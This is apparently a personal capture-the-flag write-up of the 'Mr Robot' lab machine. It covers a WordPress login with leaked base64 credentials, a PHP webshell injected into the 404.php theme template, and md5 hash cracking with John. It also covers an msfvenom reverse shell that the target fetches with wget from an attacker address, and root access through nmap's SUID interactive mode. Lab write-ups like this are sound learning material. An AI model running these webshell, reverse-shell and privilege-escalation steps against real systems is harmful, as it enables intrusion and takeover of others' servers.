Reviewed robots.txt file which reveled the first key at /key-1-of-3.txt. Robots file also pointed to a file called /fsocity.dic which seems to be a wordlist of some sort. 

As the scan with Gobuster continued it became clear the website was build on Wordpress. 

License file at /license has a password hidden in plain sight. It's a base64 encoded string in the end of the page. The encoded string translated to "elliot:ER28-0652". 


### Wordpress 

#### Enumeration

WPScan was run agains the target. The current running version 4.3.1 is vulnerable and thare public exploits available. 

Based on the output the best avenue of attack seemed to be authenticate with elliot's credentials and install a RCE capability on one of the themes that is not in active use. Then enumerate the system 
further with webshell.

#### Credentialed Enumeration

In as elliot:ER28-0652.

In Users section elliot is listed as the administrator. There is another user called mich05654.

#### Intall Webshell

As elliot edited Twenty Thirteen theme at Appearance > Themes > Editor and added a webshell to the 404.php template.

````
# Add the webshell to the beginning of the code
system($_GET[cmd]);
````

### Webshell

#### Credentialed Enumeration (Continued)

The second key was found from user robot's home folder, but it's only readable by user robot. However within the same there seems to be another file called password.raw-md5.

````
curl http://10.10.198.85/wp-content/themes/twentythirteen/404.php?cmd=ls+-al+/home/robot
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .

#### Hash Cracking

`````
# Cracking robot's hash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash

abcdefghijklmnopqrstuvwxyz (robot)
`````
#### Upgrade to RSHELL

Upgraded to a reverse shell to make the enumeration easier and faster. 

````
# Attack machine
## Create and move the payload to target (HTTP download)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.73.30 LPORT=4444 -f elf -o reverse.elf

## Open listener
rlwrap nc -nvlp 4444

# Target machine
curl http://10.10.192.99/wp-content/themes/twentythirteen/404.php?cmd=wget+http://10.10.73.30:8000/reverse.elf
curl http://10.10.192.99/wp-content/themes/twentythirteen/404.php?cmd=chmod+777+reverse.elf
curl http://10.10.192.99/wp-content/themes/twentythirteen/404.php?cmd=./reverse.elf
python -c 'import pty; pty.spawn("/bin/bash")'
````

## RSHELL

### redentialed Enumeration (Continued)

Changed user to robot and got the second key from robot's home folder.

````
su - robot
cat /home/robot/key-2-of-3.txt
````

### Privilege Escalation

Nmap had SUID bit set. This is the chosen avenue for privesc.

````
find / -perm -4000 2>/dev/null

/usr/local/bin/nmap
````

GTFOBins confirmed that there is an exploit for this. However, NMAP seems to have an interactive shell which runs in root context. Interactive shell was chosen due to its direct path to the end goal.

````
# Read the last key
./usr/local/bin/nmap --interactive
!cat /root/key-3-of-3.txt
````

## Lessons Learned

- The website was cool! :D
- /license file fooled me at first. I should've used inspector and not just verify source code. It's not that you can't read the password from the source code but I just missed the fact that I had to roll down the source code since the password was in the end of it. A silly mistake to be honest.
- I didn't know Nmap had an interactive shell. I'm sure this will come useful. 
- Hacking Wordpress is an easy process if it's A) vulnerable - most often it's the templates that are vulnerable or B) you have some creds.
